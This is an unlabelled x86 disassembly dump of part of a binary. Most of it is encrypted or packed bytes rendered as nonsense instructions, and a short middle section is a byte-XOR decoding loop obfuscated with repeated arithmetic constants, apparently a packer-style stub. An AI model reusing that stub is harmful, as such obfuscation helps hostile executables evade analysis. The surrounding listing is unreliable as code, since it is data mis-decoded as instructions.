  42858f:	repnz scas eax,DWORD PTR es:[edi]
  428591:	enter  0xb1bd,0xe7
  428595:	lock mov ch,0xf2
  428598:	out    0xb4,al
  42859a:	fcomip st,st(3)
  42859c:	cld    
  42859d:	(bad)  
  42859f:	(bad)  
  4285a0:	clc    
  4285a1:	std    
  4285a2:	fadd   st,st(6)
  4285a4:	(bad)
  4285a7:	(bad)  
  4285a9:	loope  0x42858b
  4285ab:	fdivrp st(4),st
  4285ad:	jmp    0xdcb0:0xcde9edd3
  4285b4:	enter  0xe0c0,0xb6
  4285b8:	xlat   BYTE PTR ds:[ebx]
  4285b9:	leave  
  4285ba:	mov    ch,0xd2
  4285bc:	(bad)  
  4285bd:	mov    edi,0xfbf2cfb8
  4285c2:	sti    
  4285c3:	aad    0xf0
  4285c5:	loop   0x4285c2
  4285c7:	jmp    0xb0d68cc
  4285cc:	jmp    0xe2f2:0xafdcc8dc
  4285d3:	out    0xf2,eax
  4285d5:	(bad)  
  4285d6:	iret   
  4285d7:	test   al,0xeb
  4285d9:	mul    ebp
  4285db:	fcmovu st,st(7)
  4285dd:	retf   0xc8f0
  4285e0:	aad    0xe3
  4285e2:	pop    es
  4285e3:	out    0x3,al
  4285e5:	mov    esi,0xc2ddc2d7
  4285ea:	inc    edi
  4285ec:	or     bl,dl
  4285ee:	dec    al
  4285f0:	(bad)  
  4285f2:	(bad)  
  4285f4:	lock mov cl,0xe7
  4285f7:	div    bh
  4285f9:	retf   
  4285fa:	(bad)  
  4285fb:	mov    ch,0xd1
  4285fd:	int    0xd6
  4285ff:	jecxz  0x4285be
  428601:	mov    ebp,0xbad8d5f6
  428606:	std    
  428607:	or     ah,ch
  428609:	in     al,0xe9
  42860b:	fadd   DWORD PTR [edi]
  42860d:	(bad)  
  42860e:	jmp    0xf1d7:0xc4e6e2dc
  428615:	call   0xdc276cdc
  42861a:	not    ch
  42861c:	mov    ebp,0xbcfed9ee
  428621:	(bad)  
  428623:	(bad)  
  428625:	rol    ebp,cl
  428627:	out    0xb,al
  428629:	loope  0x428608
  42862b:	mov    esp,0x50ee30d
  428630:	mov    dl,0xb2
  428632:	ror    dh,cl
  428634:	xlat   BYTE PTR ds:[ebx]
  428635:	repz retf 0xdaee
  428639:	out    0xd7,al
  42863b:	repnz sar BYTE PTR [edi-0x18030b2a],cl
  428642:	int3   
  428643:	cld    
  428644:	xlat   BYTE PTR ds:[ebx]
  428645:	mov    ebp,0x5ffbcb9
  42864a:	loope  0x428651
  42864c:	hlt    
  42864d:	(bad)  
  42864f:	les    edi,FWORD PTR [esi-0x30334f4f]
  428655:	leave  
  428656:	jmp    0x42864c
  428658:	leave  
  428659:	jmp    0x42864c
  42865b:	in     eax,0xcf
  42865d:	mov    esp,0xf9c8e1cb
  428662:	into   
  428663:	stc    
  428664:	(bad)  
  428665:	inc    dh
  428667:	aad    0xc6
  428669:	add    dl,ch
  42866b:	add    ebx,eax
  42866d:	jmp    0xc1226875
  428672:	int3   
  428673:	enter  0xd4b7,0xb2
  428677:	rcr    eax,0xe4
  42867a:	stc    
  42867b:	lods   al,BYTE PTR ds:[esi]
  42867c:	mov    ebp,0xe1ccfdba
  428681:	add    bl,bl
  428683:	(bad)  
  428684:	loop   0x42868b
  428686:	shl    ecx,1
  428688:	rcr    bh,1
  42868a:	or     dh,ch
  42868c:	add    eax,0xeef20d0e
  428691:	in     eax,0xeb
  428693:	(bad)  
  428694:	ret    0xcddb
  428697:	div    BYTE PTR [ecx-0x2b194518]
  42869d:	in     eax,dx
  42869e:	cli    
  42869f:	out    dx,al
  4286a0:	clc    
  4286a1:	loop   0x428697
  4286a3:	not    ebx
  4286a5:	loope  0x428667
  4286a7:	(bad)  
  4286a8:	retf   0xc106
  4286ab:	sti    
  4286ac:	jmp    0xeec8:0xd0cdffca
  4286b3:	in     al,0xc0
  4286b5:	mov    ah,0xcb
  4286b7:	idiv   BYTE PTR [ebx-0x202e3b14]
  4286bd:	iret   
  4286be:	rol    edx,1
  4286c0:	fidivr WORD PTR [ecx-0x19131a28]
  4286c6:	lock mov eax,0xe4000bdd
  4286cc:	or     ch,cl
  4286ce:	or     ah,cl
  4286d0:	loopne 0x42869f
  4286d2:	iret   
  4286d3:	scas   al,BYTE PTR es:[edi]
  4286d4:	enter  0xc2f5,0xf6
  4286d8:	mov    edx,0xd4e9dad4
  4286dd:	fcomp  st(4)
  4286df:	loop   0x4286c4
  4286e1:	out    dx,eax
  4286e2:	repz ret 
  4286e4:	(bad)  
  4286e6:	repnz (bad) 
  4286e8:	icebp  
  4286e9:	(bad)  
  4286ea:	clc    
  4286eb:	aad    0xc9
  4286ed:	ret    0x11fb
  4286f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4286f1:	iret   
  4286f2:	shr    ch,1
  4286f4:	leave  
  4286f5:	lods   eax,DWORD PTR ds:[esi]
  4286f6:	call   0xd6f451dd
  4286fb:	in     al,dx
  4286fc:	sti    
  4286fd:	in     eax,dx
  4286fe:	aad    0xfe
  428700:	mov    ebp,0xfedaf5dd
  428705:	(bad)
  428708:	xlat   BYTE PTR ds:[ebx]
  428709:	pop    es
  42870a:	jmp    0x4286d6
  42870c:	loope  0x4286f4
  42870e:	in     eax,0xd2
  428710:	out    dx,eax
  428711:	into   
  428712:	int    0xb0
  428714:	scas   al,BYTE PTR es:[edi]
  428715:	fdivr  st(3),st
  428717:	cli    
  428718:	mov    bl,0xc0
  42871a:	mov    edi,0xf7bcf8c8
  42871f:	rcl    ecx,cl
  428721:	loopne 0x4286e3
  428723:	loope  0x4286e7
  428725:	out    0xbc,al
  428727:	push   es
  428728:	loopne 0x428719
  42872a:	fadd   QWORD PTR [esi]
  42872c:	call   0xed525b0d
  428731:	mov    edi,0xe7dceaae
  428736:	loopne 0x42871d
  428738:	call   0xfd164c0d
  42873d:	mov    ebp,0xd6d702b9
  428742:	in     eax,dx
  428743:	(bad)  
  428744:	int    0xfa
  428746:	push   es
  428747:	retf   0xf6dc
  42874a:	retf   
  42874b:	in     eax,0xea
  42874d:	in     al,0x3
  42874f:	add    ecx,ecx
  428751:	shr    DWORD PTR [eax-0x2a29381e],1
  428757:	enter  0xf0db,0xf1
  42875b:	div    DWORD PTR [ebp-0xe364a2a]
  428761:	jecxz  0x428736
  428763:	out    0xf3,eax
  428765:	mov    esp,0xf4ddc4d5
  42876a:	(bad)  
  42876c:	fmul   st,st(5)
  42876e:	or     esi,ebp
  428770:	shl    bh,1
  428772:	mov    dl,0xf3
  428774:	mov    bl,0xf1
  428776:	out    dx,al
  428777:	mov    bh,0xc6
  428779:	out    0xee,eax
  42877b:	mov    ch,0xbd
  42877d:	in     al,0xcc
  42877f:	lock clc 
  428781:	sti    
  428782:	fnstsw WORD PTR [ebp-0x3c1bff2c]
  428788:	add    eax,0xefe8c0f9
  42878d:	in     al,0x1
  42878f:	or     edi,ecx
  428791:	jmp    0x42877f
  428793:	(bad)  
  428794:	mov    bh,0xd5
  428796:	enter  0xf5d7,0xca
  42879a:	sti    
  42879b:	les    edi,FWORD PTR [eax-0x24073517]
  4287a1:	int3   
  4287a2:	fld    QWORD PTR [edx]
  4287a4:	in     al,dx
  4287a5:	(bad)  
  4287a6:	fxch   st(2)
  4287a8:	out    0xda,eax
  4287aa:	(bad)  
  4287ac:	cld    
  4287ad:	in     al,dx
  4287ae:	add    al,0xc
  4287b0:	out    dx,eax
  4287b1:	(bad)  
  4287b3:	lock mov bh,0xe1
  4287b6:	mov    ch,0xcb
  4287b8:	fdiv   st,st(0)
  4287ba:	in     eax,dx
  4287bb:	mov    ah,0xc9
  4287bd:	mov    dh,0xd4
  4287bf:	cld    
  4287c0:	mov    edi,0xdbf0c0f3
  4287c5:	(bad)  
  4287c6:	clc    
  4287c7:	add    al,0xc0
  4287c9:	test   bl,0xef
  4287cc:	push   es
  4287cd:	add    eax,0xdccb0705
  4287d2:	scas   eax,DWORD PTR es:[edi]
  4287d3:	icebp  
  4287d4:	icebp  
  4287d5:	mov    cl,0xf2
  4287d7:	int    0xd9
  4287d9:	mov    cl,0xff
  4287db:	cmc    
  4287dc:	mov    ebp,0xdfeecbf6
  4287e1:	loope  0x4287be
  4287e3:	sti    
  4287e4:	cli    
  4287e5:	ret    0xfadf
  4287e8:	clc    
  4287e9:	add    al,0xe
  4287eb:	or     DWORD PTR [ebx],ecx
  4287ed:	in     al,dx
  4287ee:	int3   
  4287ef:	loop   0x4287b6
  4287f1:	loop   0x4287a3
  4287f3:	call   0xe83a3fe9
  4287f8:	div    DWORD PTR [esi-0x16302b29]
  4287fe:	icebp  
  4287ff:	fpatan 
  428801:	call   0xe6044bc7
  428806:	add    bl,cl
  428808:	(bad)  
  428809:	fsubr  st,st(0)
  42880b:	add    ecx,ebp
  42880d:	pop    es
  42880e:	jmp    0xc2e3:0xf0d7c3cb
  428815:	hlt    
  428816:	(bad)  
  428817:	int    0xf8
  428819:	(bad)  
  42881b:	repnz cli 
  42881d:	call   0xcf43421f
  428822:	push   es
  428823:	mov    esi,0x2f303bb
  428828:	loopne 0x42882b
  42882a:	(bad)  
  42882c:	cmc    
  42882d:	add    al,BYTE PTR [ecx]
  42882f:	int    0xf1
  428831:	in     al,0xb1
  428833:	scas   eax,DWORD PTR es:[edi]
  428834:	jmp    0xf73e79f5
  428839:	mov    cl,0xe5
  42883b:	lods   al,BYTE PTR ds:[esi]
  42883c:	jmp    0x428826
  42883e:	fnstsw WORD PTR [esi+0x500ccec]
  428844:	rol    DWORD PTR ds:0xbef9ded6,cl
  42884a:	hlt    
  42884b:	(bad)  
  42884c:	fsubr  st(4),st
  42884e:	iret   
  42884f:	stc    
  428850:	leave  
  428851:	repnz icebp 
  428853:	sar    DWORD PTR [esp+esi*8-0x38352f3e],cl
  42885a:	fcmovne st,st(3)
  42885c:	leave  
  42885d:	leave  
  42885e:	jecxz  0x428834
  428860:	repnz sar DWORD PTR [esi-0xb2ffb0a],0x0
  428868:	add    al,dl
  42886a:	jmp    0x42886c
  42886c:	jecxz  0x428878
  42886e:	loopne 0x428874
  428870:	out    dx,eax
  428871:	scas   al,BYTE PTR es:[edi]
  428872:	(bad)  
  428873:	in     eax,dx
  428874:	lock int 0xc5
  428877:	mov    bl,0xc5
  428879:	mov    ah,0xed
  42887b:	leave  
  42887c:	fldl2t 
  42887e:	icebp  
  42887f:	add    edi,ebx
  428881:	rol    DWORD PTR [edx],1
  428883:	(bad)  
  428884:	loop   0x428888
  428886:	rcr    ecx,cl
  428888:	loope  0x428888
  42888a:	xlat   BYTE PTR ds:[ebx]
  42888b:	add    edi,ebx
  42888d:	fist   DWORD PTR [edx]
  42888f:	int3   
  428890:	loop   0x428881
  428892:	(bad)  
  428893:	rcl    eax,1
  428895:	rcl    bl,0xca
  428898:	mov    al,0xb8
  42889a:	neg    ch
  42889c:	jmp    0xecc2:0xc8e2d1ef
  4288a3:	(bad)  
  4288a5:	add    ebx,ebp
  4288a7:	mov    ah,0x4
  4288aa:	add    edi,eax
  4288ac:	leave  
  4288ad:	add    ecx,DWORD PTR [ecx]
  4288af:	retf   
  4288b0:	ret    
  4288b1:	jecxz  0x42887b
  4288b3:	ror    bl,0xec
  4288b6:	mov    al,0xcc
  4288b8:	stc    
  4288b9:	mov    ah,0xcf
  4288bb:	jmp    0xd6db:0xdbd1dddb
  4288c2:	aam    0xc0
  4288c4:	idiv   bl
  4288c6:	ret    
  4288c7:	inc    BYTE PTR [edi]
  4288c9:	les    edi,FWORD PTR [ebp-0x2303f032]
  4288cf:	fldcw  WORD PTR [edx-0x2d111a1e]
  4288d5:	scas   al,BYTE PTR es:[edi]
  4288d6:	fcmovbe st,st(3)
  4288d8:	mov    edx,0xf1e6fed8
  4288dd:	jmp    0x428897
  4288df:	not    ebp
  4288e1:	shr    dh,cl
  4288e3:	mov    esp,0xf6d7d8e6
  4288e8:	cmc    
  4288e9:	or     cl,ah
  4288eb:	loope  0x4288e1
  4288ed:	add    edi,edi
  4288ef:	(bad)  
  4288f0:	jmp    0xee2046a5
  4288f5:	idiv   ebx
  4288f7:	jmp    0xd1f6:0xe6e8edf1
  4288fe:	mov    ch,0xf3
  428900:	fdivr  st(0),st
  428902:	(bad)  
  428904:	inc    BYTE PTR [edi]
  428906:	(bad)  
  428907:	repnz add bh,dh
  42890a:	add    eax,eax
  42890c:	fsub   st,st(0)
  42890e:	or     ch,ch
  428910:	mov    eax,0xf0c2e2cb
  428915:	shr    eax,cl
  428917:	retf   0xdbfb
  42891a:	in     eax,0xd9
  42891c:	fsubp  st(7),st
  42891e:	lock int 0xda
  428921:	sar    BYTE PTR [ecx-0x3a1d0621],cl
  428927:	stc    
  428928:	retf   
  428929:	jmp    0x4288f1
  42892b:	fcmovnu st,st(3)
  42892d:	in     eax,0xdd
  42892f:	(bad)  
  428931:	(bad)  
  428932:	scas   al,BYTE PTR es:[edi]
  428933:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428934:	mov    cl,0xb1
  428936:	out    dx,eax
  428937:	mov    al,0xb6
  428939:	dec    ebp
  42893b:	lock retf 
  42893d:	mov    ah,0xd8
  42893f:	int3   
  428940:	add    edi,edi
  428942:	fucom  st(6)
  428944:	inc    ebx
  428946:	jmp    0x4cf:0xe5e6f5d7
  42894d:	or     eax,0xc6add3ca
  428952:	fdiv   QWORD PTR [ebx-0x34492d43]
  428958:	shl    eax,0xc8
  42895b:	hlt    
  42895c:	int3   
  42895d:	test   al,0xdd
  428960:	aad    0xe0
  428962:	icebp  
  428963:	inc    ecx
  428965:	in     al,0xbd
  428967:	out    0xf4,eax
  428969:	loope  0x428971
  42896b:	into   
  42896c:	out    0xcc,eax
  42896e:	out    dx,al
  42896f:	loop   0x42894e
  428971:	test   eax,0xedc4cbd2
  428976:	ret    0xcaec
  428979:	clc    
  42897a:	lods   eax,DWORD PTR ds:[esi]
  42897b:	idiv   DWORD PTR [edx-0x71c1243]
  428981:	(bad)  
  428982:	ret    0xd6bc
  428985:	(bad)  
  428986:	neg    cl
  428988:	jmp    0x6da:0xe5e5e7fc
  42898f:	or     al,0xa7
  428991:	shr    edi,1
  428993:	loop   0x42898c
  428995:	sti    
  428996:	aam    0xd3
  428998:	(bad)  
  428999:	jmp    0xf6be:0xfac9f0b1
  4289a0:	int3   
  4289a1:	add    cl,bh
  4289a3:	shl    ch,1
  4289a5:	not    ebx
  4289a7:	(bad)  
  4289a9:	clc    
  4289aa:	jmp    0x4289a4
  4289ac:	push   es
  4289ad:	cld    
  4289ae:	(bad)  
  4289b0:	shr    BYTE PTR [edi-0xe422120],cl
  4289b6:	(bad)
  4289ba:	iret   
  4289bb:	fucomi st,st(5)
  4289bd:	aad    0xf4
  4289bf:	add    edi,edi
  4289c1:	sti    
  4289c2:	in     al,dx
  4289c3:	rol    BYTE PTR [edx+edi*4],cl
  4289c6:	cld    
  4289c7:	jmp    0xe4ce:0xce00c4e2
  4289ce:	into   
  4289cf:	cld    
  4289d0:	ror    ch,0xcf
  4289d3:	mov    dh,0xf4
  4289d5:	mov    bl,0xfb
  4289d7:	sar    BYTE PTR [edx-0x16404017],0xe4
  4289de:	(bad)  
  4289df:	mov    ebp,0xffe0bfb9
  4289e4:	aad    0xf9
  4289e6:	(bad)  
  4289e7:	or     edi,esi
  4289e9:	shl    esp,0xc7
  4289ec:	hlt    
  4289ed:	stc    
  4289ee:	iret   
  4289ef:	fmulp  st(1),st
  4289f1:	call   0xe4f66bb3
  4289f6:	jecxz  0x4289f3
  4289f8:	iret   
  4289f9:	sti    
  4289fa:	into   
  4289fb:	in     eax,dx
  4289fc:	icebp  
  4289fd:	mov    esi,0xe2dddff3
  428a02:	std    
  428a03:	std    
  428a04:	ffree  st(0)
  428a06:	fcomp  st(6)
  428a08:	push   es
  428a09:	aam    0xc6
  428a0b:	hlt    
  428a0c:	add    esp,esp
  428a0e:	int    0xcc
  428a10:	rcl    dl,cl
  428a12:	mov    bh,0xa4
  428a14:	int3   
  428a15:	mov    bh,0xcd
  428a17:	ret    0xecb9
  428a1a:	mov    ch,0xb7
  428a1d:	cld    
  428a1e:	fldln2 
  428a20:	test   esi,0xbc0cdce
  428a26:	ret    
  428a27:	add    esp,edx
  428a29:	(bad)
  428a2c:	jmp    0x428a16
  428a2e:	or     eax,DWORD PTR [ebx]
  428a30:	mov    bl,0x89
  428a32:	test   DWORD PTR [esi+edi*8-0x7a720001],ebx
  428a39:	mov    dh,bh
  428a3b:	(bad)  
  428a3c:	dec    DWORD PTR [ecx-0x17f7b]
  428a42:	dec    DWORD PTR [ebp-0x15f7b]
  428a48:	dec    DWORD PTR [ecx-0x1737b]
  428a4e:	dec    DWORD PTR [ebx-0x1937b]
  428a54:	(bad)  
  428a55:	cmp    eax,DWORD PTR [ebp-0x164]
  428a5b:	jae    0x428c0b
  428a61:	mov    eax,DWORD PTR [ebp-0x180]
  428a67:	mov    DWORD PTR [eax],0xf89c85a5
  428a6d:	mov    eax,DWORD PTR [ebp-0x174]
  428a73:	mov    DWORD PTR [eax],0xf89c85ae
  428a79:	lea    eax,[ebp-0x185]
  428a7f:	mov    DWORD PTR [ebp-0x18c],eax
  428a85:	mov    eax,DWORD PTR [ebp-0x168]
  428a8b:	xor    eax,0x75108b5
  428a90:	add    eax,0x3272fb
  428a95:	mov    ecx,DWORD PTR [ebp-0x164]
  428a9b:	imul   ecx,eax
  428a9e:	mov    eax,DWORD PTR [ebp-0x18c]
  428aa4:	mov    edx,DWORD PTR [ebp-0x190]
  428aaa:	mov    cl,BYTE PTR [edx+ecx*1]
  428aad:	mov    BYTE PTR [eax],cl
  428aaf:	mov    eax,DWORD PTR [ebp-0x168]
  428ab5:	xor    eax,0x75108b5
  428aba:	add    eax,0x3272fb
  428abf:	mov    ecx,DWORD PTR [ebp-0x164]
  428ac5:	imul   ecx,eax
  428ac8:	mov    eax,DWORD PTR [ebp-0x170]
  428ace:	xor    eax,0x75108b5
  428ad3:	add    eax,DWORD PTR [ebp-0x190]
  428ad9:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272fb]
  428ae1:	mov    ecx,DWORD PTR [ebp-0x178]
  428ae7:	xor    ecx,0x75108b5
  428aed:	lea    eax,[eax+ecx*1+0x3272fb]
  428af4:	movzx  ecx,BYTE PTR [ebp-0x185]
  428afb:	xor    ecx,eax
  428afd:	mov    BYTE PTR [ebp-0x185],cl
  428b03:	mov    al,BYTE PTR [ebp-0x185]
  428b09:	mov    ecx,DWORD PTR [ebp-0x168]
  428b0f:	xor    ecx,0x75108b5
  428b15:	add    ecx,0x3272fb
  428b1b:	mov    edx,DWORD PTR [ebp-0x164]
  428b21:	imul   edx,ecx
  428b24:	mov    ecx,DWORD PTR [ebp-0x190]
  428b2a:	mov    BYTE PTR [ecx+edx*1],al
  428b2d:	mov    eax,DWORD PTR [ebp-0x168]
  428b33:	xor    eax,0x75108b5
  428b38:	add    eax,0x3272fb
  428b3d:	mov    ecx,DWORD PTR [ebp-0x164]
  428b43:	imul   ecx,eax
  428b46:	mov    eax,DWORD PTR [ebp-0x18c]
  428b4c:	mov    edx,DWORD PTR [ebp-0x190]
  428b52:	mov    cl,BYTE PTR [edx+ecx*1]
  428b55:	mov    BYTE PTR [eax],cl
  428b57:	mov    eax,DWORD PTR [ebp-0x168]
  428b5d:	xor    eax,0x75108b5
  428b62:	add    eax,0x3272fb
  428b67:	mov    ecx,DWORD PTR [ebp-0x164]
  428b6d:	imul   ecx,eax
  428b70:	mov    eax,DWORD PTR [ebp-0x184]
  428b76:	xor    eax,0x75108b5
  428b7b:	add    eax,DWORD PTR [ebp-0x190]
  428b81:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272fb]
  428b89:	mov    ecx,DWORD PTR [ebp-0x160]
  428b8f:	xor    ecx,0x75108b5
  428b95:	lea    eax,[eax+ecx*1+0x3272fb]
  428b9c:	movzx  ecx,BYTE PTR [ebp-0x185]
  428ba3:	xor    ecx,eax
  428ba5:	mov    BYTE PTR [ebp-0x185],cl
  428bab:	mov    al,BYTE PTR [ebp-0x185]
  428bb1:	mov    ecx,DWORD PTR [ebp-0x168]
  428bb7:	xor    ecx,0x75108b5
  428bbd:	add    ecx,0x3272fb
  428bc3:	mov    edx,DWORD PTR [ebp-0x164]
  428bc9:	imul   edx,ecx
  428bcc:	mov    ecx,DWORD PTR [ebp-0x190]
  428bd2:	mov    BYTE PTR [ecx+edx*1],al
  428bd5:	mov    eax,DWORD PTR [ebp-0x184]
  428bdb:	xor    eax,0x75108b5
  428be0:	add    eax,0x3272fb
  428be5:	mov    ecx,DWORD PTR [ebp-0x16c]
  428beb:	xor    ecx,0x75108b5
  428bf1:	add    ecx,0x3272fb
  428bf7:	imul   eax,ecx
  428bfa:	add    eax,DWORD PTR [ebp-0x164]
  428c00:	mov    DWORD PTR [ebp-0x164],eax
  428c06:	jmp    0x428a4f
  428c0b:	mov    eax,DWORD PTR [ebp-0x154]
  428c11:	xor    eax,0x75108b5
  428c16:	mov    ecx,DWORD PTR [ebp-0x17c]
  428c1c:	xor    ecx,0x75108b5
  428c22:	add    ecx,0x3272fb
  428c28:	mov    edx,DWORD PTR [ebp-0x194]
  428c2e:	mov    esi,DWORD PTR [ebp-0x184]
  428c34:	xor    esi,0x75108b5
  428c3a:	add    esi,0x3272fb
  428c40:	imul   esi,edx
  428c43:	or     esi,ecx
  428c45:	lea    eax,[esi+eax*1+0x3272fb]
  428c4c:	mov    ecx,DWORD PTR [ebp-0x154]
  428c52:	xor    ecx,0x75108b5
  428c58:	add    ecx,DWORD PTR [ebp-0x144]
  428c5e:	lea    eax,[ecx+eax*1+0x3272fb]
  428c65:	mov    DWORD PTR [ebp-0x144],eax
  428c6b:	jmp    0x42b034
  428c70:	mov    eax,DWORD PTR [ebp-0x154]
  428c76:	xor    eax,0x75108b5
  428c7b:	mov    ecx,DWORD PTR [ebp-0x144]
  428c81:	lea    eax,[ecx+eax*1+0x3272fb]
  428c88:	jmp    0x42b02e
  428c8d:	scas   eax,DWORD PTR es:[edi]
  428c8e:	in     al,0x37
  428c90:	dec    ebx
  428c91:	je     0x428cdb
  428c93:	mul    DWORD PTR [edx+ebx*1-0x1e]
  428c97:	imul   esi,DWORD PTR [edx-0x3c3c9b15],0xfffffffa
  428c9e:	lods   eax,DWORD PTR ds:[esi]
  428c9f:	jns    0x428d1c
  428ca1:	add    bl,BYTE PTR [eax-0xf338485]
  428ca7:	(bad)  
  428ca8:	jmp    0xef1d637d
  428cad:	mov    dl,0xed
  428caf:	fucomip st,st(3)
  428cb1:	shl    ebp,cl
  428cb3:	fiadd  WORD PTR [ebx]
  428cb5:	mov    esi,0xdddcc6d0
  428cba:	ret    0x3c3
  428cbd:	call   0xf34678a1
  428cc2:	add    ebp,esp
  428cc4:	mov    bl,0xf2
  428cc6:	lock mov cl,0xae
  428cc9:	int3   
  428cca:	mov    ebx,0xfffadab0
  428ccf:	jmp    0xeebc:0xf1cab2fa
  428cd6:	add    eax,edx
  428cd8:	rol    bh,1
  428cda:	mov    esp,0xe907ebfd
  428cdf:	or     BYTE PTR [eax],cl
  428ce1:	loope  0x428ce7
  428ce3:	int    0xcc
  428ce5:	test   al,0xdc
  428ce7:	retf   
  428ce8:	vpaddq xmm3,xmm3,xmm0
  428ced:	shl    bh,1
  428cef:	in     al,0xdb
  428cf1:	jmp    0x428ce4
  428cf3:	mov    ebx,0xf3f3daf2
  428cf8:	xlat   BYTE PTR ds:[ebx]
  428cf9:	mul    bh
  428cfb:	std    
  428cfc:	fdiv   st,st(6)
  428cfe:	or     bh,ah
  428d00:	push   es
  428d01:	or     eax,0xc3d30add
  428d06:	(bad)  
  428d07:	leave  
  428d08:	int    0xf5
  428d0a:	call   0xc02b68fe
  428d0f:	sti    
  428d10:	iret   
  428d11:	add    eax,ebx
  428d13:	loop   0x428ce5
  428d15:	add    bh,dl
  428d17:	(bad)  
  428d18:	mov    esp,0xe3ffe4e7
  428d1d:	jmp    0xee0793f1
  428d22:	loop   0x428d13
  428d24:	jmp    0xb2aa:0xd6b6e4cc
  428d2b:	mov    ch,0xef
  428d2d:	clc    
  428d2e:	repnz int 0xd9
  428d31:	fcomp  st(2)
  428d33:	call   0x42f6039
  428d38:	fidivr WORD PTR [ebx+ebx*8-0x17043421]
  428d3f:	or     eax,0x50f05c5
  428d44:	mov    cl,0xc1
  428d46:	lock loopne 0x428d3b
  428d49:	test   esi,0xb8b9c7d0
  428d4f:	fcmovu st,st(2)
  428d51:	cld    
  428d52:	jmp    0x428d42
  428d54:	into   
  428d55:	out    dx,al
  428d56:	int    0xd1
  428d58:	(bad)
  428d5b:	in     eax,0xc4
  428d5d:	push   es
  428d5e:	test   bh,0xed
  428d61:	cld    
  428d62:	loope  0x428d36
  428d64:	lods   eax,DWORD PTR ds:[esi]
  428d65:	out    dx,al
  428d66:	loop   0x428d4f
  428d68:	icebp  
  428d69:	int3   
  428d6a:	in     al,dx
  428d6b:	mov    ah,0xd2
  428d6d:	(bad)  
  428d6e:	aam    0xd2
  428d70:	(bad)  
  428d71:	sti    
  428d72:	(bad)  
  428d74:	(bad)  
  428d75:	add    ebx,ecx
  428d77:	ret    
  428d78:	(bad)
  428d7b:	clc    
  428d7c:	out    0xc6,eax
  428d7e:	enter  0xcbd4,0x9
  428d82:	or     eax,0xf6edede9
  428d87:	scas   al,BYTE PTR es:[edi]
  428d88:	scas   al,BYTE PTR es:[edi]
  428d89:	int3   
  428d8a:	retf   
  428d8b:	leave  
  428d8c:	repz shl BYTE PTR [ebp-0x46363b14],cl
  428d93:	hlt    
  428d94:	mov    bh,0xbf
  428d96:	hlt    
  428d97:	out    dx,al
  428d98:	rol    BYTE PTR [edi],cl
  428d9a:	loope  0x428d6c
  428d9c:	std    
  428d9d:	ffreep st(4)
  428d9f:	out    0xa,eax
  428da1:	in     eax,0xc
  428da3:	fsubp  st(7),st
  428da5:	leave  
  428da6:	mov    bh,0xc9
  428da8:	(bad)  
  428da9:	int    0xcf
  428dab:	in     eax,dx
  428dac:	out    dx,eax
  428dad:	in     al,dx
  428dae:	fdiv   DWORD PTR [esi-0x17442b29]
  428db4:	add    dh,cl
  428db6:	sar    BYTE PTR [eax+0xac5dee2],0xbf
  428dbd:	retf   
  428dbe:	out    dx,eax
  428dbf:	sti    
  428dc0:	clc    
  428dc1:	or     ah,ah
  428dc3:	retf   
  428dc4:	lock fcomp st(7)
  428dc7:	in     eax,0xae
  428dc9:	not    ch
  428dcb:	repnz icebp 
  428dcd:	mov    eax,0xf4e4d7da
  428dd2:	hlt    
  428dd3:	loope  0x428dac
  428dd5:	into   
  428dd6:	stc    
  428dd7:	int    0xd6
  428dd9:	shl    bl,1
  428ddb:	add    dl,cl
  428ddd:	loope  0x428dd9
  428ddf:	jecxz  0x428dab
  428de1:	in     eax,dx
  428de2:	out    0xec,eax
  428de4:	in     al,dx
  428de5:	mov    cl,0xc5
  428de7:	mov    cl,0xcc
  428de9:	in     al,0xf7
  428deb:	in     eax,dx
  428dec:	retf   
  428ded:	leave  
  428dee:	not    ebp
  428df0:	in     al,0xf9
  428df2:	out    dx,al
  428df3:	rcl    edx,cl
  428df5:	stc    
  428df6:	ret    0xfbfd
  428df9:	fnsetpm(287 only) 
  428dfb:	fdecstp 
  428dfd:	fmul   st(3),st
  428dff:	cli    
  428e00:	add    eax,esp
  428e02:	ror    DWORD PTR [eax],cl
  428e04:	mov    ebp,0xb3b7afa6
  428e09:	cmc    
  428e0a:	lods   eax,DWORD PTR ds:[esi]
  428e0b:	vpmaxsw xmm6,xmm7,xmm2
  428e0f:	out    dx,eax
  428e10:	iret   
  428e11:	stc    
  428e12:	lock iret 
  428e14:	ffree  st(1)
  428e16:	rol    BYTE PTR [edi],1
  428e18:	aad    0xd4
  428e1a:	div    dl
  428e1c:	mov    edi,0xdadee1c4
  428e21:	or     DWORD PTR [esi],ecx
  428e23:	jecxz  0x428dde
  428e25:	out    0xc6,al
  428e27:	(bad)  
  428e28:	shl    BYTE PTR [edi-0x62e0e4e],0xd8
  428e2f:	int3   
  428e30:	retf   0xfdb2
  428e33:	enter  0xdbec,0xb9
  428e37:	sti    
  428e38:	shl    esp,0xf7
  428e3b:	jmp    0xcb3e5327
  428e40:	pop    es
  428e41:	ret    0xd0a
  428e44:	out    dx,eax
  428e45:	fdivr  DWORD PTR [esi+edi*4-0x3a12353f]
  428e4c:	fsub   st,st(4)
  428e4e:	int3   
  428e4f:	out    0xea,al
  428e51:	sti    
  428e52:	shl    bh,1
  428e54:	sti    
  428e55:	mov    dh,0x0
  428e57:	inc    BYTE PTR ds:0xc6fadec0
  428e5d:	jmp    0xe9e1:0xdfe102e2
  428e64:	loopne 0x428e55
  428e66:	loopne 0x428e31
  428e68:	mov    bh,0xf6
  428e6a:	repz retf 0xc6e1
  428e6e:	mov    al,0xda
  428e70:	fdiv   st,st(2)
  428e72:	(bad)  
  428e74:	(bad)  
  428e76:	ret    0xd6f5
  428e79:	jmp    0x428e82
  428e7b:	pop    es
  428e7c:	vpmulhuw ymm3,ymm5,ymm3
  428e80:	iret   
  428e81:	or     BYTE PTR [ecx],al
  428e83:	call   0xf32d6e55
  428e88:	leave  
  428e89:	mov    cl,0xfa
  428e8b:	mov    al,0xd6
  428e8d:	les    edi,FWORD PTR [eax-0x2a472647]
  428e93:	ret    
  428e94:	fmulp  st(6),st
  428e96:	(bad)  
  428e98:	fcmovnb st,st(5)
  428e9a:	cli    
  428e9b:	fdivr  st,st(5)
  428e9d:	out    0xd7,eax
  428e9f:	add    ah,dl
  428ea1:	fmul   QWORD PTR [edx+eax*1]
  428ea4:	repz loop 0x428e64
  428ea7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428ea8:	jmp    0x428e7d
  428eaa:	(bad)  
